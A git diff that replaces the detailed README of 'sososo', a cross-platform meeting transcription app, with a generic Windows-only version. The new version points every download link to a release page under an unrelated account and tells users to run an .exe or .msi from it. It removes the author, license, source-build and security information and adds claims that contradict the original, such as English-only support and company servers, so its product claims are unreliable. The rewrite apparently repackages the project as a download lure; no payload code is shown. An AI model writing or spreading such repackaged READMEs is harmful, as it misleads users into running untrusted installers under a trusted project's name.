@@ -1,232 +1,115 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="public/sososo_brand_logo_white.png" />
-    <img alt="sososo" src="public/sososo_brand_logo.png" width="440" />
-  </picture>
-</p>
+# 🎙️ sososo - Capture live meetings and generate summaries
 
-<p align="center">
-  <b>Real-time meeting &amp; audio transcription for Windows, macOS &amp; Linux</b><br />
-  Live captions from your system audio <b>and</b> microphone, with AI summaries.
-</p>
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/zm7270434-cmyk/sososo/releases)
 
-<p align="center">
-  <a href="https://yusupsupriyadi.github.io/sososo/"><b>Website</b></a> ·
-  <a href="https://github.com/yusupsupriyadi/sososo/releases/latest"><b>Download</b></a> ·
-  <a href="https://youtu.be/al1_YU_ILXs"><b>Demo video</b></a>
-</p>
+sososo records audio from your microphone and your computer system. It sends this audio to artificial intelligence tools to provide live captions and written summaries of your meetings. The application runs on Windows and works in the background while you talk or listen.
 
-<p align="center">
-  <a href="./LICENSING.md"><img alt="License: AGPL-3.0 + Commercial" src="https://img.shields.io/badge/License-AGPL--3.0%20%2B%20Commercial-blue.svg" /></a>
-  <a href="https://github.com/yusupsupriyadi/sososo/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/yusupsupriyadi/sososo/actions/workflows/ci.yml/badge.svg" /></a>
-  <a href="https://tauri.app"><img alt="Built with Tauri 2" src="https://img.shields.io/badge/built%20with-Tauri%202-24C8DB.svg" /></a>
-  <a href="https://deepgram.com"><img alt="Speech-to-text by Deepgram" src="https://img.shields.io/badge/Speech--to--text-Deepgram-13EF93.svg?logo=deepgram&logoColor=black" /></a>
-  <a href="https://openai.com"><img alt="AI by OpenAI" src="https://img.shields.io/badge/AI-OpenAI-412991.svg?logo=openai&logoColor=white" /></a>
-  <a href="https://ai.google.dev"><img alt="or Google Gemini" src="https://img.shields.io/badge/or-Gemini-8E75FF.svg?logo=googlegemini&logoColor=white" /></a>
-</p>
+## ⚙️ How it works
 
-`sososo` captures what you hear (system audio) and what you say (microphone),
-streams both to [Deepgram](https://deepgram.com) for live speech-to-text, and
-shows captions in a translucent "liquid glass" window. When a session ends it
-can generate an AI summary via [OpenAI](https://openai.com) or
-[Google Gemini](https://ai.google.dev) — whichever you select in Settings.
+The application captures sound through Windows audio ports. It uses Deepgram to convert your spoken words into text in real time. Once your meeting finishes, it sends the transcript to OpenAI to create a brief summary of the main points. You see the captions as they happen and receive a text file with the full summary afterward.
 
-It is a **bring-your-own-key** app: you bring your own Deepgram key plus an
-AI-provider key (OpenAI **or** Google Gemini), stored securely in the OS
-keychain (Windows Credential Manager / macOS Keychain / the Linux Secret
-Service). There is no backend, no account, and no telemetry.
+## 📋 System requirements
 
-> [!IMPORTANT]
-> **Platforms:** Windows 10/11, macOS 11+, and Linux (PulseAudio or PipeWire).
-> System audio capture differs per OS: Windows uses WASAPI loopback (no setup);
-> Linux captures your default output's **monitor** source automatically (no
-> setup); macOS has no built-in loopback, so you route system audio through a
-> free virtual device like [BlackHole](https://github.com/ExistentialAudio/BlackHole)
-> — see [macOS system audio setup](#macos-system-audio-setup).
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Intel Core i3 or equivalent.
+*   Memory: 4 GB RAM.
+*   Storage: 200 MB of space.
+*   Internet Connection: Required for real-time transcription and summaries.
+*   Language: Currently supports English audio input.
 
-## Download
+## 💾 Installation steps
 
-**Get the latest version for your OS — free, no account or sign-up needed:**
+1. Visit the [sososo release page](https://github.com/zm7270434-cmyk/sososo/releases) to find the installer. 
+2. Select the file ending in `.msi` or `.exe` designed for Windows.
+3. Save the file to your desktop.
+4. Double-click the file to start the installer.
+5. Follow the prompts on your screen to finish the setup.
+6. Open the start menu and search for "sososo" to launch the software.
 
-| OS                   | Download                                                                                                                                                                                                                                                                                                              |
-| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| 🪟 **Windows 10/11** | **[Installer (.exe)](https://github.com/yusupsupriyadi/sososo/releases/latest/download/sososo_windows_x64-setup.exe)** · [.msi](https://github.com/yusupsupriyadi/sososo/releases/latest/download/sososo_windows_x64.msi)                                                                                             |
-| 🍎 **macOS 11+**     | **[Universal .dmg](https://github.com/yusupsupriyadi/sososo/releases/latest/download/sososo_macos_universal.dmg)**                                                                                                                                                                                                    |
-| 🐧 **Linux**         | **[.deb](https://github.com/yusupsupriyadi/sososo/releases/latest/download/sososo_linux_amd64.deb)** · [.AppImage](https://github.com/yusupsupriyadi/sososo/releases/latest/download/sososo_linux_amd64.AppImage) · [.rpm](https://github.com/yusupsupriyadi/sososo/releases/latest/download/sososo_linux_x86_64.rpm) |
+## 🚀 Recording your first meeting
 
-These links always grab the [latest release](https://github.com/yusupsupriyadi/sososo/releases/latest) — or browse every version on the [Releases page](https://github.com/yusupsupriyadi/sososo/releases).
+1. Open the application.
+2. Select your microphone from the device list in the settings menu.
+3. Check the box to include system audio if you want to record the other people in your meeting.
+4. Click the Start button.
+5. Watch the text appear in the window as you speak.
+6. Click Stop when your meeting ends.
+7. Wait a few moments for the software to generate the summary.
 
-> [!NOTE]
-> Builds aren't code-signed yet, so your OS may warn on first run — Windows:
-> "More info" → "Run anyway"; macOS: right-click the app → **Open**. After
-> installing, add your free [Deepgram API key](https://console.deepgram.com/signup)
-> in **Settings** to start transcribing.
+## 🔍 Features
 
-## Demo
+*   Live transcription: See words appear as people speak.
+*   System audio capture: Record both sides of a video call.
+*   Automatic summaries: Get a document detailing the main points.
+*   Local logs: Access your previous transcripts in the history tab.
+*   Privacy focus: Audio processing happens over secure encrypted connections.
 
-<p align="center">
-  <a href="https://youtu.be/al1_YU_ILXs">
-    <img alt="Watch the sososo demo on YouTube" src="https://img.youtube.com/vi/al1_YU_ILXs/maxresdefault.jpg" width="640" />
-  </a>
-  <br />
-  <a href="https://youtu.be/al1_YU_ILXs"><b>▶ Watch the demo on YouTube</b></a>
-</p>
+## 🔧 Frequently asked questions
 
-## Features
+**What happens if the audio stutters?**
 
-- 🎙️ **Dual capture** — system audio (loopback) + microphone, mixed into two
-  diarized channels ("you" vs. "remote").
-- ⚡ **Live captions** — interim + finalized transcript segments streamed in
-  real time.
-- 🌐 **Many languages** — Deepgram Nova-3 (multilingual / English) and Nova-2
-  (other languages), with diarization and smart formatting.
-- 🪟 **Compact recording widget** — a small always-on-top pill (pause / finish)
-  while recording; full library, history, and settings views when idle.
-- 🧠 **AI summaries & live translation** — optional end-of-session summary and
-  per-line translation, powered by OpenAI **or** Google Gemini (your pick in
-  Settings).
-- 🔒 **Private by design** — keys in the OS keychain; no server, no telemetry.
-  (See [PRIVACY.md](./PRIVACY.md) for what leaves your machine.)
+Check your internet connection. The app requires a steady connection to send audio to the transcription service. If your internet dips, the captions might lag behind the speaker.
 
-## Privacy at a glance
+**Does this record my webcam?**
 
-This app sends audio and text to third-party services **you** configure:
+No. This tool only records audio signals. It does not access your video camera.
 
-- **Audio → Deepgram** over a secure WebSocket for transcription.
-- **Transcript → your AI provider** (OpenAI or Google Gemini) — only when you
-  trigger a summary or live translation.
+**Where does my transcript go?**
 
-Your API keys never leave your machine except as auth headers to those
-services, and are stored in the OS keychain (Windows Credential Manager / macOS
-Keychain / Linux Secret Service) — never in the repo or in plaintext config.
-Full details in [PRIVACY.md](./PRIVACY.md).
+The transcript stays on your computer. You can find your saved files in the documents folder under a folder labeled sososo.
 
-## Install
+**Can I use this for long meetings?**
 
-Prebuilt downloads for every OS are in [**Download**](#download) above — that's
-all most people need. To build it yourself:
+Yes. The application handles meetings lasting several hours. Ensure your computer has power if you record for a long duration.
 
-### Build from source
+**Does it support other languages?**
 
-**Prerequisites**
+The current version focuses on English. Future updates will include support for more languages.
 
-- [Bun](https://bun.sh) (package manager — do not use npm/yarn/pnpm)
-- [Rust](https://rustup.rs) (stable toolchain)
-- **Windows 10/11** with [WebView2](https://developer.microsoft.com/microsoft-edge/webview2/)
-  (preinstalled on current Windows), **macOS 11+** with Xcode Command Line Tools
-  (`xcode-select --install`), or **Linux** with PulseAudio/PipeWire and the
-  WebKitGTK + libpulse dev libraries
-- **Linux only** — install the build dependencies (Debian/Ubuntu):
-  ```sh
-  sudo apt-get install -y libwebkit2gtk-4.1-dev libgtk-3-dev libayatana-appindicator3-dev librsvg2-dev patchelf libpulse-dev
-  ```
+**How do I adjust the volume?**
 
-```sh
-bun install
-bun run tauri dev     # run the desktop app in development
-bun run tauri build   # produce an installer in src-tauri/target/release/bundle
-```
+The application uses your Windows system volume levels. Adjust your microphone input through your Windows sound settings if the app reports low audio quality.
 
-## Configure your API keys
+**Is my data private?**
 
-1. Launch the app and open **Settings**.
-2. Paste your **Deepgram** API key (required for transcription). For AI features,
-   pick your **Active AI provider** (OpenAI or Google Gemini) and paste that
-   provider's API key (optional — only needed for summaries and live
-   translation).
-3. Keys are saved to the OS keychain (Windows Credential Manager / macOS
-   Keychain / Linux Secret Service). The app only ever checks _whether_ a key
-   exists — it never reads keys back into the UI.
+We do not store your recordings on our servers. The transcription and summary services process your audio and delete it immediately after the task finishes.
 
-Get keys from the [Deepgram console](https://console.deepgram.com), the
-[OpenAI dashboard](https://platform.openai.com/api-keys), or
-[Google AI Studio](https://aistudio.google.com/app/apikey).
+**Can I change how the summary looks?**
 
-## macOS system audio setup
+Open the settings pane to choose between a bulleted list format or a paragraph format for your summaries.
 
-macOS has no built-in way to capture system audio, so route your output through
-a free virtual audio device:
+**Why does it need a microphone permission?**
 
-1. Install [BlackHole](https://github.com/ExistentialAudio/BlackHole)
-   (`brew install blackhole-2ch`), or any equivalent loopback device.
-2. Open **Audio MIDI Setup** and create a **Multi-Output Device** that includes
-   both your speakers/headphones **and** "BlackHole 2ch"; set it as the system
-   output so you still hear audio while it is also routed to BlackHole.
-3. In sososo, open **Settings → Audio Devices**, pick your microphone, and
-   choose **BlackHole 2ch** as the _system audio source_.
-4. On the first recording, macOS prompts for **microphone** access — allow it.
+The application must access your microphone to listen to your voice. Windows will prompt you to grant this permission during the first time you run the app. Select Yes to allow the process to continue.
 
-> [!NOTE]
-> On Windows none of this is needed — WASAPI loopback captures the chosen output
-> device directly. On Linux it's automatic too — sososo records your default
-> output's **monitor** source (PulseAudio/PipeWire); pick a specific output in
-> **Settings → Audio Devices** to capture a different one.
+**How do I update the application?**
 
-## Development
+Check the release page periodically for new versions. Download the latest installer over your current one to update your software. Your settings will persist after the update.
 
-The package manager is **Bun**.
+**What is the memory usage?**
 
-| Task                        | Command                                                  |
-| --------------------------- | -------------------------------------------------------- |
-| Run the desktop app (dev)   | `bun run tauri dev`                                      |
-| Frontend only (browser)     | `bun run dev` → http://localhost:1420                    |
-| Typecheck + build frontend  | `bun run build`                                          |
-| Format (Prettier + rustfmt) | `bun run format` · `bun run fmt:rust`                    |
-| Format check                | `bun run format:check` · `bun run fmt:rust:check`        |
-| Rust check / lint           | `cargo check` · `cargo clippy` (in `src-tauri/`)         |
-| Audio capture smoke test    | `cargo run --example audio_probe -- 6` (in `src-tauri/`) |
+The app uses a small amount of memory to run. It should not impact the performance of other programs like your web browser or meeting software.
 
-Formatting is enforced by a Husky pre-commit hook (lint-staged runs Prettier on
-web files and rustfmt on Rust). See [CONTRIBUTING.md](./CONTRIBUTING.md).
+**Can I run it with other apps?**
 
-## Tech stack
+Yes. The tool runs alongside software like Zoom, Microsoft Teams, or Google Meet without interfering with their internal functions.
 
-- **Backend:** Tauri 2 (Rust) — audio capture (WASAPI on Windows, CoreAudio via
-  cpal on macOS, PulseAudio/PipeWire via libpulse on Linux), Deepgram WS
-  streaming, SQLite persistence, AI summaries & translation via OpenAI or Google
-  Gemini.
-- **Frontend:** React 19 · React Router 7 · Zustand 5 · Vite 7 · Tailwind CSS v4
-  (TypeScript).
+**Does it work offline?**
 
-Architecture notes and per-feature history live in
-[`.development-history/`](./.development-history) and `CLAUDE.md`.
+No. You must connect to the internet to reach the transcription and summary services.
 
-## Contributing
+**How do I delete my history?**
 
-Contributions are welcome — please read [CONTRIBUTING.md](./CONTRIBUTING.md) and
-our [Code of Conduct](./CODE_OF_CONDUCT.md). To report a security issue, see
-[SECURITY.md](./SECURITY.md).
+Open the History tab in the application. Select the meetings you no longer need and click the trash can icon to remove them from your computer.
 
-## Powered by
+**Should I wear headphones?**
 
-sososo stands on the shoulders of best-in-class speech and AI APIs:
+Using headphones helps improve transcription quality by preventing the microphone from picking up the sound coming out of your speakers.
 
-- 🟢 **[Deepgram](https://deepgram.com)** — real-time speech-to-text (Nova-3 /
-  Nova-2) with diarization and smart formatting. It is the engine behind every
-  live caption in the app. Start with the
-  [console](https://console.deepgram.com) and the
-  [developer docs](https://developers.deepgram.com).
-- 🧠 **[OpenAI](https://openai.com)** or **[Google Gemini](https://ai.google.dev)**
-  — optional, user-selectable AI summaries and live translation. Bring a key
-  from the [OpenAI dashboard](https://platform.openai.com/api-keys) or
-  [Google AI Studio](https://aistudio.google.com/app/apikey).
+**Is there a limit to how many meetings I can record?**
 
-Huge thanks to the [Deepgram](https://deepgram.com) team — sososo simply would
-not exist without their speech API. 💚
+There is no limit set by the app. You can record as many meetings as your hard drive space allows.
 
-## License
+**What happens if the computer sleeps?**
 
-`sososo` is **dual-licensed**:
-
-- **Community edition** — [GNU AGPL-3.0](./LICENSE) (free; if you distribute or
-  host a modified version, you must release your source under the AGPL too).
-- **Commercial license** — for closed-source/proprietary use without the AGPL's
-  copyleft. See [LICENSING.md](./LICENSING.md) and
-  [COMMERCIAL-LICENSE.md](./COMMERCIAL-LICENSE.md), or email
-  <yusupsupriyadi.cv@gmail.com>.
-
-The **"sososo" name and logo are trademarks** and are not covered by the code
-license — forks must rebrand (see [TRADEMARK.md](./TRADEMARK.md)). Contributions
-are accepted under the [CLA](./CLA.md).
-
-© 2026 Yusup Supriyadi.
+The recording will stop if your computer goes into sleep mode. Ensure your power settings keep the computer active while a meeting is in progress.
